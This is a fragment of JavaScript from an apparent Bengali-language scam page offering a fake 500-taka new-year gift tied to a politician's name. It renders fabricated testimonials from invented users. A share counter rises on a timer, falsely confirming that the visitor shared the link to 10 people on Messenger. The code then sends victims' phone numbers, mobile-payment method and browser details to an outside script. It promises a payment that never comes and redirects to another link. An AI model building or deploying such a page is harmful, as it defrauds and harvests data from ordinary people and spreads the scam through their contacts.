        { name: "জুই আক্তার", text: "আমার ভাইও টাকা পেয়েছে। তারেক রহমান জিন্দাবাদ।", time: "১২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=5" },
        { name: "সাইফুল ইসলাম", text: "আমি ৫০০ টাকা পেয়েছি, ধন্যবাদ ভাইয়া!", time: "১৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=6" },
        { name: "তানজিলা রিয়া", text: "খুব সুন্দর উদ্যোগ। নতুন বছরের সেরা উপহার!", time: "১৮ মিনিট আগে", img: "https://i.pravatar.cc/150?u=7" },
        { name: "হাসান আলী", text: "আমিও আবেদন করলাম, দেখা যাক কি হয়। তবে আমার বন্ধু টাকা পেয়েছে।", time: "২০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=8" },
        { name: "শামীম রেজা", text: "হ্যাঁ, ১০০% রিয়েল। আমি টাকা পাওয়ার পর কমেন্ট করতেছি।", time: "২৪ মিনিট আগে", img: "https://i.pravatar.cc/150?u=9" },
        { name: "ফারহানা ববি", text: "টাকা পেলাম! মেসেন্জারে বন্ধুদের পাঠিয়েছি এখন পেলাম।", time: "২৬ মিনিট আগে", img: "https://i.pravatar.cc/150?u=10" },
        { name: "আরিফ বিল্লাহ", text: "দারুণ অফার, ধন্যবাদ টিম তারেক রহমান।", time: "৩০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=11" },
        { name: "রেহেনা পারভীন", text: "আমি বিকাশে ৫০০ টাকা পেয়েছি জাস্ট ৫ মিনিট আগে।", time: "৩২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=12" },
        { name: "ইমন আহমেদ", text: "আমি ১০ জনকে শেয়ার দিছি এখন ফর্ম পূরণ করবো।", time: "৩৫ মিনিট আগে", img: "https://i.pravatar.cc/150?u=13" },
        { name: "তৌফিক হোসেন", text: "সবাই চেষ্টা করেন, টাকা সত্যিই পাওয়া যাচ্ছে।", time: "৪০ মিনিট আগে", img: "https://i.pravatar.cc/150?u=14" },

        { name: "মনিরা বেগম", text: "৫০০ টাকা পেয়ে অনেক ভালো লাগছে। শুভ নববর্ষ।", time: "৪৮ মিনিট আগে", img: "https://i.pravatar.cc/150?u=16" },
        { name: "জাহিদ হাসান", text: "বন্ধুরা সবাই পাবেন, শুধু মেসেঞ্জারে শেয়ার করেন ১০ জনকে।", time: "৫২ মিনিট আগে", img: "https://i.pravatar.cc/150?u=17" },
        { name: "রিয়াজ মাহমুদ", text: "আমি আর আমার বন্ধু দুজনেই পেয়েছি। থ্যাঙ্কস।", time: "১ ঘণ্টা আগে", img: "https://i.pravatar.cc/150?u=18" }
    ];

    // কমেন্টগুলো রেন্ডার করা
    const commentsList = document.getElementById('comments-list');
    commentsData.forEach(comment => {
        commentsList.innerHTML += `
            <div class="comment-item">
                <img src="${comment.img}" alt="User">
                <div class="comment-text-box">
                    <span class="user-name">${comment.name}</span>
                    <span class="comment-text">${comment.text}</span>
                    <div class="comment-time">${comment.time}</div>
                </div>
            </div>
        `;
    });

    function openMessenger() {
        // মেসেঞ্জার শেয়ার লিঙ্ক
        const currentUrl = window.location.href;
        window.location.href = "fb-messenger://share/?link=" + encodeURIComponent(currentUrl);

        // শেয়ার গণনা বাড়ানো
        setTimeout(() => {
            if (shareCount < requiredShares) {
                shareCount++;
                let percent = (shareCount / requiredShares) * 100;
                document.getElementById('p-bar').style.width = percent + '%';
                document.getElementById('counter-text').innerText = `শেয়ার সম্পন্ন: ${shareCount}/${requiredShares}`;
                
                if (shareCount >= requiredShares) {
                    document.getElementById('share-area').style.display = 'none';
                    document.getElementById('payment-form').style.display = 'block';
                }
            }
        }, 2000);
    }

    async function finalSubmit() {
        const phone = document.getElementById('phone').value;
        const method = document.getElementById('method').value;
        const userAgent = navigator.userAgent;

        if (phone.length < 11) {
            Swal.fire('ভুল নম্বর', 'সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন', 'error');
            return;
        }

        document.getElementById('subBtn').disabled = true;
        document.getElementById('subBtn').innerText = "প্রসেসিং...";

        try {
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    method: method,
                    phone: phone,
                    userAgent: userAgent
                })
            });
        } catch (e) { console.log("Sheet error"); }

        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });

        Swal.fire({
            title: 'অভিনন্দন!',
            text: 'আপনি সফলভাবে আবেদন করেছেন। আগামী ২০ মিনিটের মধ্যে আপনার অ্যাকাউন্টে ৫০০ টাকা জমা হবে।',
            icon: 'success',
            confirmButtonText: 'ঠিক আছে (OK)',
            confirmButtonColor: '#006a4e',
            allowOutsideClick: false
        }).then((result) => {
            if (result.isConfirmed) {
                window.location.href = directLink;
            }
        });
    }
